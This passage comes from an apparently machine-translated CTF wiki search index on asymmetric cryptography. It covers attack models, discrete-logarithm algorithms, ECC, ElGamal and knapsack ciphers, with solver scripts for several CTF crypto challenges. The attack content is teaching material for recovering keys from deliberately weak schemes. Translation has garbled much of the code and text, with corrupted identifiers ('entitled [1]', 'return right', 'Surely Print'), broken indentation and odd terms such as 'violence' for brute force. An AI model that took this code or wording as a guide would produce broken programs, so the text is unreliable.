vulnerability to crack. Of course, it is also possible to bypass the corresponding detection by constructing a false hash value or a digital signature.</p> <p>In general, we will assume that the attacker knows the cryptosystem to be cracked, and the attack types are usually divided into the following four types:</p> Attack Type Description <p>| ciphertext attack | only has ciphertext | | Known plaintext attack | Have ciphertext and corresponding plaintext | | Select plaintext attack | Have encryption permission, can encrypt the plaintext and get the corresponding ciphertext| | Select ciphertext attack | Have decryption permission, can decrypt the ciphertext and get the corresponding plaintext |</p> <p>Note</p> <p>Note: I have previously written about the common scenarios of these attacks. As I continue to learn, I gradually realize that these types of attacks focus on describing the capabilities of attackers and may be applicable to a wide variety of scenarios. Therefore, the amendment was made.</p> <p>Recommend some information here</p> <ul> <li>[Khan Academy Open Class] (http://open.163.com/special/Khan/moderncryptography.html)</li> <li>[In-depth cryptography - Principles and Applications of Common Encryption Technologies] (https://github.com/yuankeyang/python/blob/master/%E3%80%8A%E6%B7%B1%E5%85%A5% E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%B8%B8%E7% 94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA% 94%E7%94%A8%E3%80%8B.pdf)</li> <li>https://cryptopals.com/, a bunch of cryptography exercises.</li> </ul> <p>Note</p> <p>It is recommended to consider whether to buy a book in the case of reading the open class and simply looking at the e-book, because the book is usually left unused.</p>"},{"location":"crypto/introduction/#reference","title":"Reference","text":"<ul> <li>[Wikipedia-Cryptography] (https://en.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6)</li> </ul> <p>Info</p> <p>Most of the definitions and examples in this section refer to Wikipedia.</p>"},{"location":"crypto/asymmetric/introduction/","title":"Introduction","text":"<p>In asymmetric cryptography, the keys used by the encryptor and the decrypter are different. Typical examples are RSA encryption, knapsack encryption, and elliptic curve encryption.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/","title":"discrete logarithm","text":""},{"location":"crypto/asymmetric/discrete-log/discrete-log/#basic-definition","title":"Basic definition","text":"<p>When we understand discrete logarithms, let's first look at a few basic definitions.</p> <p>Definition 1</p> <p>In group G, g is the generator of G, that is, each element in group G can be written as y=g^k, which we call k is the logarithm of y in group G.</p> <p>Definition 2</p> <p>Let m\\geq 1, (a,m)=1, let a^d \\equiv 1\\pmod m be the smallest positive integer d called a to the exponent or order of modulo m, we will generally It is recorded as \\delta_m(a).</p> <p>Definition 3</p> <p>When \\delta_m(a)=\\varphi(m), a is called the original root of modulo m, which is called the original root of m.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#some-properties","title":"Some properties","text":"<p>** Nature 1**</p> <p>The smallest positive integer d that makes a^d \\equiv 1\\pmod m true must have d\\mid\\varphi(m).</p> <p>Property 2</p> <p>The necessary and sufficient condition for the existence of the original root of the modulo m is m=2,4,p^{\\alpha}, 2p^{\\alpha} , where p is an odd prime, \\alpha is positive Integer.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#discrete-logarithm-problem","title":"Discrete logarithm problem","text":"<p>Knowing g,p,y, for the equation y\\equiv g^x \\pmod p , solving x is a difficult problem. But when p has certain characteristics, it can be solved. For example, the order of this group is a smooth number.</p> <p>It is this problem that constitutes a large part of modern cryptography, including Diffie\u2013Hellman key exchange, ElGamal algorithm, ECC, etc.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#discrete-logarithm-solution","title":"Discrete logarithm solution","text":""},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_1","title":"\u66b4\u66b4","text":"<p>Given y\\equiv g^x \\pmod p, we can violently enumerate x to get the true value of x.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#baby-step-giant-step","title":"Baby-step giant-step","text":"<p>This method is often referred to as a small step, which uses the idea of an intermediate encounter attack.</p> <p>We can make x=im+j, where m= \\lceil \\sqrt n\\rceil , then the integers i and j are all in the range 0 to m.</p> <p>therefore</p>  y = g ^ x = g ^ {im + j}  <p>That is</p> y(g^{-m})^i=g^j <p>Then we can enumerate all the j and calculate it and store it in a set S, then we enumerate i again, calculate y(g^{-m})^i, once we find the calculation The result in the set S shows that we got a collision and got i and j.</p> <p>This is obviously a way of compromise between time and space. We convert a O(n) time complexity, O(1) space complexity algorithm to a O(\\sqrt n) The algorithm of time complexity and space complexity of O(\\sqrt n).</p> <p>among them</p> <ul> <li>Each increment of j means \"baby-step\", multiplied by g at a time.</li> <li>Each increment of i means \"giant-step\", multiplied by g^{-m} at a time.</li> </ul> <pre><code>def bsgs(g, y, p):\n\n    m = int(ceil(sqrt(p - 1)))\n\n    S = {pow(g, j, p): j for j in range(m)}\n\n    gs = pow(g, p - 1 - m, p)\n\n    for i in range(m):\n\n        if y in S:\n\n            return i * m + S[y]\n\ny = y * gs% p\n    return None\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-algorithm","title":"Pollard's \u03c1 algorithm","text":"<p>We can solve the above problem with the time complexity of O(\\sqrt n) and the space complexity of O(1). Please use Google for your specific principles.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-kangaroo-algorithm","title":"Pollard\u2019s kangaroo algorithm","text":"<p>If we know that the range of x is a \\leq x \\leq b, then we can solve the above problem with the time complexity of O(\\sqrt{ba}). Please use Google for your specific principles.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm","title":"Pohlig-Hellman algorithm","text":"<p>Let's assume that the above mentioned group has a rank of n for the element g, and n is a smooth number: n=\\prod\\limits_{i=1}^r p_i^{e_i}.</p> <ol> <li>For each i \\in \\{1,\\ldots,r\\} :</li> <li>Calculate g_i \\equiv g^{n/p_i^{e_i}} \\pmod m. According to the Lagrange theorem, the order of g_i in the group is p_i^{e_i}.</li> <li>Calculate y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i }} \\equiv g_i^{x_i} \\pmod m, here we know y_i,m,g_i, and x_i ranges from [0,p_i^{e_i}), by n is a Smooth numbers, the range is small, so we can quickly find x_i using methods such as Pollard's kangaroo algorithm.</li> <li>According to the above derivation, we can get for i \\in \\{1,\\ldots,r\\} , x \\equiv x_i \\pmod{p_i^{e_i}} , which can be solved by Chinese remainder theorem .</li> </ol> <p>The above process can be briefly described in the following figure:</p>   ![Pohlig Hellman Algorithm](figure/Pohlig-Hellman-Diagram.png)   <p>The complexity is O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right), and it can be seen that the complexity is still very low.</p> <p>But when n is prime, m=2n+1, then the complexity and O(\\sqrt m) are almost indistinguishable.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#2018-crackme-java","title":"2018 \u56fd\u8d5bcrackme java","text":"<p>code show as below</p> <pre><code>import java.math.BigInteger;\n\nimport java.util.Random;\n\n\npublic class Test1 {\n\n    static BigInteger two =new BigInteger(\"2\");\n\n    static BigInteger p = new BigInteger(\"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\");\n\n    static BigInteger h= new BigInteger(\"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\");\n\n\n\n    /*\n\n     Alice write the below algorithm for encryption.\n\n     The public key {p, h} is broadcasted to everyone.\n\n    @param val: The plaintext to encrypt.\n\n        We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length.\n\n    */\n\n    public static String pkEnc(String val){\n\n        BigInteger[] ret = new BigInteger[2];\n\n        BigInteger bVal=new BigInteger(val.toLowerCase(),36);\n\n        BigInteger r =new BigInteger(new Random().nextInt()+\"\");\n\nret [0] = two.modPow (r, p);entitled [1] = h.modPow (r, p) .multiply (bVal);\nreturn right [0] .toString (36) + &amp;quot;==&amp;quot; + ret [1] .toString (36);\n    }\n\n\n\n    /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know.\n\n    public static String skDec(String val,BigInteger x){\n\n        if(!val.contains(\"==\")){\n\n            return null;\n\n        }\n\n        else {\n\n            BigInteger val0=new BigInteger(val.split(\"==\")[0],36);\n\n            BigInteger val1=new BigInteger(val.split(\"==\")[1],36);\n\n            BigInteger s=val0.modPow(x,p).modInverse(p);\n\n            return val1.multiply(s).mod(p).toString(36);\n\n        }\n\n    }\n\n   */\n\n\n\n    public static void main(String[] args) throws Exception {\n\n        System.out.println(\"You intercepted the following message, which is sent from Bob to Alice:\");\n\n        BigInteger bVal1=new BigInteger(\"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\",36);\n\n    BigInteger bVal2=new BigInteger(\"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\",36);\n\n    BigInteger r =new BigInteger(new Random().nextInt()+\"\");\n\n    System.out.println(r);\n\n        System.out.println(bVal1);\n\n    System.out.println(bVal2);\n\n    System.out.println(\"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\");\n\n        System.out.println(\"Please figure out the plaintext!\");\n\n    }\n\n}\n</code></pre> <p>Basic function is calculation</p> <p>$ R_0 = 2 ^ r  way $ p</p> <p>$ R_1 = b * h ^ r  way $ p</p> <p>It can be found that the range of r is [0,2^{32}), so we can use the BSGS algorithm as follows</p> <pre><code>from sage.all import *\n\n\n\nc1 = int(\n\n    'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco',\n\n    36\n\n)\n\nc2 = int(\n\n    '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc',\n\n    36\n\n)\n\nprint c1, c2\n\np = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\n\nh = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\n\n# generate the group\n\nconst2 = 2\nconst2 = Mod (const2, p)\nc1 = Mod(c1, p)\n\nc2 = Mod(c2, p)\n\nh = Mod(h, p)\n\nprint '2', bsgs(const2, c1, bounds=(1, 2 ^ 32))\n\n\n\nr = 152351913\n\n\n\nnum = long(c2 / (h**r))\n\nSurely Print\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#reference","title":"Reference","text":"<ul> <li>Elementary number theory, Pan Chengdong, Pan Chengyu</li> <li> <p>https://ee.stanford.edu/~hellman/publications/28.pdf</p> </li> <li> <p>https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2</p> </li> <li> <p>https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html</p> </li> </ul>"},{"location":"crypto/asymmetric/discrete-log/ecc/","title":"ECC","text":""},{"location":"crypto/asymmetric/discrete-log/ecc/#overview","title":"Overview","text":"<p>ECC is called elliptic curve encryption, EllipseCurve Cryptography, which is a public key cryptography based on elliptic curve mathematics. Unlike traditional encryption methods based on the difficulty of large-scale factorization, ECC relies on the difficulty of solving the discrete logarithm problem of elliptic curves. Its main advantage is that it can maintain the same password strength while using a shorter key length than other methods. Currently, the finite field mainly used in the elliptic curve has</p> <ul> <li>The integer field GF(p), which is modulo prime, is usually more efficient on general purpose processors.</li> <li>The Galois Field GF (2^m) with a feature of 2 can be designed with dedicated hardware.</li> </ul>"},{"location":"crypto/asymmetric/discrete-log/ecc/#basic-knowledge","title":"basic knowledge","text":"<p>Let us first look at the elliptic curve on the finite field. The elliptic curve on the finite field is the definition of the elliptic curve.</p> <p>y^2+axy+by=x^3+cx^2+dx+e</p> <p>All coefficients in the finite element GF(p) are elements, where p is a large prime number.</p> <p>Of course, not all elliptic curves are suitable for encryption. The most common equations are as follows</p> <p>y^2=x^3+ax+b</p> <p>Where 4a^3+27b^2 \\bmod p \\neq 0</p> <p>We call all the solutions (x, y), (x\\in Fp, y \\in Fp) of the equation, and a set called \"infinity point\" (O) as an ellipse defined on Fp. The curve is denoted as E(Fp).</p> <p>Generally defining elliptic curve passwords requires the following conditions</p> <p>Suppose E(Fp) for the point operation \\oplus forms a possible group (commutative group, inverse element existence, closure, etc.), set p\\in E(Fq), and the t satisfying the following conditions is very large</p> <p>$ p  oplus p  oplus ...  oplus p = O $</p> <p>There are a total of t p participating in the operation. Here we call t the period of p. In addition, for Q\\in E(Fq) , there is a positive integer m such that the following formula holds, defining m=log_pq</p> <p>Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p (m p participating in the operation)</p> <p>In addition, suppose G is the generator of the E_q (a,b), that is, all the elements in it can be generated, and the order is the smallest positive integer n satisfying nG=O.</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#elgamal-in-ecc","title":"ElGamal in ECC","text":"<p>Here we assume that User B wants to encrypt the message and pass it to User A.</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#key-generation","title":"Key Generation","text":"<p>User A first selects an elliptic curve E_q (a,b) and then selects a generator G on it, assuming its order is n, and then selects a positive integer n_a as the key, and calculates $P_a=n_aG $.</p> <p>Among them, E_q(a,b), q,G will be made public.</p> <p>The public key is P_a and the private key is $n_a $.</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#encryption","title":"Encryption","text":"<p>User B is sending a message m to User A, assuming that message m has been encoded as a point on the elliptic curve, the encryption steps are as follows</p> <ol> <li>Query user A's public key E_q(a,b), q, P_a,G.</li> <li>Select the random number k in the interval of (1, q-1).</li> <li>Calculate the point (x_1,y_1)=kG based on A's public key.</li> <li>Calculate the point (x_2,y_2)=kP_a. If it is O, restart from the second step.</li> <li>Calculate C=m+(x_2,y_2)</li> <li>Send ((x_1,y_1),C) to A.</li> </ol>"},{"location":"crypto/asymmetric/discrete-log/ecc/#decryption","title":"Decryption","text":"<p>The decryption steps are as follows</p> <ol> <li>Calculate the point n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) using the private key.</li> <li>Calculate the message m=C-(x_2,y_2) .</li> </ol>"},{"location":"crypto/asymmetric/discrete-log/ecc/#key-point","title":"key point","text":"<p>The key point here is that even if we know (x_1,y_1), it is difficult to know k, which is determined by the difficulty of the discrete logarithm problem.</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#2013-seccon-ctf-quals-cryptanalysis","title":"2013 SECCON CTF quals Cryptanalysis","text":"<p>Here we take Cryptanalysis in SECCON CTF quals in 2013 as an example. The topics are as follows:</p> <p></p> <p>Here, we know the elliptic curve equation and the corresponding generator element base, and also know the corresponding modulus and public key and the encrypted result.</p> <p>But we can see that our modulus is too small, we violently enumerate the results.</p> <p>Here directly refer to the sage program on github, violently ran out of the secret key. Then you can decrypt it.</p> <pre><code>a = 1234577\n\nb = 3213242\n\nn = 7654319\n\n\n\nE = EllipticCurve(GF(n), [0, 0, 0, a, b])\n\n\n\nbase = E ([5234568, 2287747])\npub = E ([2366653, 1424308])\n\n\nc1 = E ([5081741, 6744615])\nc2 = E ([610619, 6218])\n\n\nX = base\n\n\n\nfor i in range(1, n):\n\n    if X == pub:\n\n        secret = i\n\n        print \"[+] secret:\", i\n\n        break\n\n    else:\n\n        X = X + base\n\n        print i\n\n\n\nm = c2 - (c1 * secret)\n\n\n\nprint \"[+] x:\", m[0]\n\nprint &amp;quot;[+] y:&amp;quot;, m [1]\nprint \"[+] x+y:\", m[0] + m[1]\n</code></pre> <p>Violence ran out of results</p> <pre><code>[+] secret: 1584718\n\n[+] x: 2171002\n\n[+] and: 3549912\n[+] x+y: 5720914\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/ecc/#reference","title":"Reference","text":"<ul> <li>https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis</li> </ul>"},{"location":"crypto/asymmetric/discrete-log/elgamal/","title":"ElGamal","text":""},{"location":"crypto/asymmetric/discrete-log/elgamal/#overview","title":"Overview","text":"<p>The security of the ElGamal algorithm is based on the difficulty of solving the discrete logarithm problem. It was proposed in 1984 and is also a double-key cryptosystem, which can be used for both encryption and digital signature.</p> <p>If we assume that p is a decimal prime of at least 160 bits, ** and p-1 has a large prime factor**, and g is the generator of Z_p^*, and y \\in Z_p^* . So how to find a unique integer x (0\\leq x \\leq p-2) that satisfies g^x \\equiv y \\bmod p is algorithmically difficult, here is x as x=log_gy .</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#fundamental","title":"Fundamental","text":"<p>Here we assume that A wants to send a message m to B.</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#key-generation","title":"Key Generation","text":"<p>The basic steps are as follows</p> <ol> <li>It is difficult to choose a prime p that is large enough to solve the discrete logarithm problem on Z_p.</li> <li>Select the generator g of Z_p^*.</li> <li>Randomly select the integer k, 0\\leq k \\leq p-2 , and calculate g^k \\equiv y \\bmod p .</li> </ol> <p>The private key is {k} and the public key is {p,g,y}.</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#encryption","title":"Encryption","text":"<p>A selects the random number r \\in Z_{p-1} and encrypts the plaintext E_k(m,r)=(y_1,y_2) . Where y_1 \\equiv g^r \\bmod p , y_2 \\equiv my^r \\bmod p .</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#decryption","title":"Decryption","text":"<p>D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#difficult","title":"Difficult","text":"<p>Although we know y1, we have no way of knowing the corresponding r.</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2015-mma-ctf-alicegame","title":"2015 MMA CTF Alicegame","text":"<p>Here we take Alicegame in MMA-CTF-2015 in 2015 as an example. This question was originally difficult to do when the source code was not given, because this gives an m, and gives an r to get the encrypted result, which is too difficult to think about.</p> <p>Let's analyze the source code briefly. First, the program originally generated pk and sk.</p> <pre><code>    (pk, sk) = genkey(PBITS)\n</code></pre> <p>Where the genkey function is as follows</p> <pre><code>def genkey(k):\n\n    p = getPrime(k)\n\ng = random.randrange (2, p)\nx = random.randrange (1, p-1)\n    h = pow(g, x, p)\n\n    pk = (p, g, h)\n\nsk = (p, x)\n    return (pk, sk)\n</code></pre> <p>p is the prime number of the k position, g is the book in the range of (2, p), and x is in the range of (1, p-1). And calculated h \\equiv g^x \\bmod p . Seeing this, I almost know that this should be an ElGamal encryption on a number field. Where pk is the public key and sk is the private key.</p> <p>The program then outputs 10 times m and r. And, use the following function to encrypt</p> <pre><code>def encrypt(pk, m, r = None):\n\n    (p, g, h) = pk\n\n    if r is None:\n\nr = random.randrange (1, p-1)\n    c1 = pow(g, r, p)\n\n    c2 = (m * pow(h, r, p)) % p\n\n    return (c1, c2)\n</code></pre> <p>Its encryption method is indeed ElGamal encryption.</p> <p>Finally the program encrypts the flag. At this time r is by the program itself random.</p> <p>Analysis, here we can control m and r in ten rounds, and</p> <p>c_1 \\equiv g^r \\bmod p</p> <p>c_2 \\equiv m * h^{r} \\bmod p</p> <p>If we set</p> <ol> <li>r=1, m=1, then we can get c_1=g, c_2=h.</li> <li>r=1, m=-1, then we can get c_1=g, c_2 = ph. Then we can get the prime number p.</li> </ol> <p>What is the use of prime p? The number of bits in p is around 201, which is very big.</p> <p>But ah, after it generated the prime number p, it was not checked. We have said before that p-1 must have a large factor, and if there is a small prime factor, then we can attack. The attack mainly uses the baby step-giant step and Pohlig-Hellman algorithm algorithm. If you are interested, you can look at it. Here, the sage itself has a function to calculate the discrete logarithm, which can handle such a situation. See discrete_log .</p> <p>The specific code is as follows, it should be noted that this memory consumption is relatively large, do not just take the virtual machine to run. . . There is also this Nima interaction that makes me a headache,,,,</p> <pre><code>import socket\n\nfrom Crypto.Util.number import *\n\nfrom sage.all import *\n\n\n\n\n\ndef get_maxfactor(N):\n\n    f = factor(N)\n\n    print 'factor done'\n\n    return f[-1][0]\n\n\n\nmaxnumber = 1 &lt;&lt; 70\n\ni = 0\n\nwhile 1:\n\n    print 'cycle: ',i\n\nsock = socket.socket (socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"localhost\", 9999))\n\n    sock.recv(17)\n\n    # get g,h\n\n    sock.recv(512)\n\n    sock.sendall(\"1\\n\")\n\n    sock.recv(512)\n\n    sock.sendall(\"1\\n\")\n\n    data = sock.recv(1024)\n\n    print data\n\n    if '\\n' in data:\n\n        data =data[:data.index('\\n')]\n\n    else:\n\n        # receive m=\n\n        sock.recv(1024)\n\n    (g,h) = eval(data)\n\n\n\n    # get g,p\n\n    sock.sendall(\"-1\\n\")\n\n    sock.recv(512)\n    sock.sendall(\"1\\n\")\n\n    data = sock.recv(1024)\n\n    print data\n\n    if '\\n' in data:\n\n        data = data[:data.index('\\n')]\n\n    else:\n\n        # receive m=\n\n        sock.recv(512)\n\n    (g,tmp) = eval(data)\n\n    p = tmp+h\n\n    tmp = get_maxfactor(p-1)\n\n    if tmp&lt;maxnumber:\n\n        print 'may be success'\n\n        # skip the for cycle\n\n        sock.sendall('quit\\n');\n\n        data = sock.recv(1024)\n\n        print 'receive data: ',data\n\n        data = data[data.index(\":\")+1:]\n\n        (c1,c2)=eval(data)\n\n        # generate the group\n\n        g = Mod(g, p)\n\n        h = Mod(h, p)\n\n        c1 = Mod(c1, p)\n\n        c2 = Mod(c2, p)\n\n        x = discrete_log(h, g)\n\n        print \"x = \", x\n\n        print \"Flag: \", long_to_bytes(long(c2 / ( c1 ** x)))\n\n    sock.sendall('quit\\n')\n\n    sock.recv(1024)\n\n    sock.close()\n\n    i += 1\n</code></pre> <p>In the end, the computer is not enough memory, it is not calculated, and sometimes it will collapse and run a few times. .</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2018-code-blue-lagalem","title":"2018 Code Blue lagalem","text":"<p>The title is described below</p> <pre><code>from Crypto.Util.number import *\n\nfrom key import FLAG\n\n\n\nsize = 2048\n\nrand_state = getRandomInteger (size // 2)\n\n\n\n\ndef keygen(size):\n\n    q = getPrime(size)\n\nk = 2\n    while True:\n\n        p = q * k + 1\n\n        if isPrime(p):\n\n            break\n\nk + = 1\n    g = 2\n\n    while True:\n\n        if pow(g, q, p) == 1:\n\n            break\n\n        g += 1\n\n    A = getRandomInteger(size) % q\n\n    B = getRandomInteger(size) % q\n\n    x = getRandomInteger(size) % q\n\n    h = pow(g, x, p)\n\n    return (g, h, A, B, p, q), (x,)\n\n\n\n\n\ndef rand(A, B, M):\n\n    global rand_state\n\n    rand_state, ret = (A * rand_state + B) % M, rand_state\n\nreturn right\n\n\n\n\ndef encrypt(pubkey, m):\n\n    g, h, A, B, p, q = pubkey\n\n    assert 0 &lt; m &lt;= p\n\n    r = rand(A, B, q)\n\n    c1 = pow(g, r, p)\n\n    c2 = (m * pow(h, r, p)) % p\n\n    return (c1, c2)\n\n\n\n\n\n# pubkey, privkey = keygen(size)\n\n\n\nm = bytes_to_long(FLAG)\n\nc1, c2 = encrypt(pubkey, m)\n\nc1_, c2_ = encrypt(pubkey, m)\n\n\n\nprint pubkey\n\nprint(c1, c2)\n\nprint(c1_, c2_)\n</code></pre> <p>It can be seen that the algorithm is an ElGamal encryption, which gives the same plaintext two sets of encrypted results. The characteristic is that the random number r used is generated by the linear congruential generator, then we know</p> <p>c2 \\equiv m * h^{r} \\bmod p</p> <p>c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p</p> <p>then</p> <p>c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p</p> <p>Among them, c2, c2_, A, B, h are known. Then we know</p> <p>m^{A-1} \\equiv t \\bmod p</p> <p>We assume that we know a primitive root g of p, then we can assume</p> <p>g^x \\equiv t</p> <p>g^y \\equiv m</p> <p>then</p> <p>g^{y(A-1)}\\equiv g^x \\bmod p</p> <p>then</p> <p>y(A-1) \\equiv x \\bmod p-1</p> <p>Then we know</p> <p>y(A-1)-k(p-1)=x</p> <p>Here we know A, p, x, then we can use the extended Euclidean theorem to find</p> <p>s(A-1)+w(p-1)=gcd(A-1,t-1)</p> <p>If gcd(A-1, t-1)=d, then we calculate directly</p> <p>t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p</p> <p>If d=1, then m is directly known.</p> <p>If d is not 1, then it is a bit of a hassle. .</p> <p>This problem is exactly d=1, so it can be solved easily.</p> <pre><code>import gmpy2\n\ndata = open('./transcript.txt').read().split('\\n')\n\ng, h, A, B, p, q = eval(data[0])\n\n\n\nc1, c2 = eval(data[1])\n\nc1_, c2_ = eval(data[2])\n\n\n\ntmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)\n\ntmp = tmp % p\n\n\n\nprint 't=', tmp\n\nprint 'A=', A\n\nPrint &amp;#39;= p, p\ngg, x, y = gmpy2.gcdext(A - 1, p - 1)\n\nprint gg\n\n\n\nm = gmpy2.powmod(tmp, x, p)\n\nprint hex(m)[2:].decode('hex')\n</code></pre> <p>flag</p> <pre><code>\u279c  2018-CodeBlue-lagalem git:(master) \u2717 python exp.py\n\nt= 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323\n\nA= 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158\n\np= 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717\n\n1\n\nCBCTF {183a3ce8ed93df613b002252dfc741b2}\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#reference","title":"Reference","text":"<ul> <li>https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf\uff0c20.4.1</li> </ul>"},{"location":"crypto/asymmetric/knapsack/knapsack/","title":"Knapsack Cipher","text":""},{"location":"crypto/asymmetric/knapsack/knapsack/#backpack-problem","title":"Backpack problem","text":"<p>First, let's introduce the backpack problem. Suppose a backpack can weigh W. Now there are n items with weights of a_1, a_2,..., a_n. We want to ask which items can fit the backpack. Filled up and each item can only be loaded once. This is actually solving such a problem.</p> <p>$$</p> <p>x_1a_1 + x_2a_2 +, ..., + x_na_n = W $$</p> <p>All of these x_i can only be 0 and 1. Obviously we have to enumerate all the combinations of n items to solve this problem, and the complexity is 2^n, which is the beauty of backpack encryption.</p> <p>When encrypting, if we want to encrypt the plaintext as x, then we can represent it as an n-bit binary number and then multiply it by a_i to get the encrypted result.</p> <p>But what should I do when decrypting? We did make it difficult for others to decrypt the ciphertext, but we really have no way to decrypt the ciphertext.</p> <p>But when a_i is super-incremental, we have a solution. The so-called super-increment means that the sequence satisfies the following conditions.</p> <p>$$</p> <p>a_i&gt;\\sum_{k=1}^{i-1}a_k</p> <p>$$</p> <p>That is, the ith number is greater than the sum of all the previous numbers.</p> <p>Why can you decrypt it if you meet such a condition? This is because if the encrypted result is greater than a_n, the preceding coefficient must be 1. On the contrary, the equation cannot be established anyway. Therefore, we can get the corresponding plaintext immediately.</p> <p>However, this has another problem. Since a_i is public, if the attacker intercepts the ciphertext, it is easy to crack such a password. In order to make up for this problem, an encryption algorithm such as Merkle\u2013Hellman appears. We can use the initial backpack set as the private key, the transformed backpack set as the public key, and then slightly change the encryption process.</p> <p>Although the super-increment sequence is mentioned here, it is not said how it is generated.</p>"},{"location":"crypto/asymmetric/knapsack/knapsack/#merklehellman","title":"Merkle\u2013Hellman","text":""},{"location":"crypto/asymmetric/knapsack/knapsack/#public-private-key-generation","title":"Public private key generation","text":""},{"location":"crypto/asymmetric/knapsack/knapsack/#generating-a-private-key","title":"Generating a private key","text":"<p>The private key is our initial backpack set. Here we use the super-increment sequence, how to generate it? We can assume that a_1=1, then a_2 is greater than 1, and similarly can generate subsequent values in turn.</p>"},{"location":"crypto/asymmetric/knapsack/knapsack/#generating-a-public-key","title":"Generating a public key","text":"<p>In the process of generating a public key, the operation of modular multiplication is mainly used.</p> 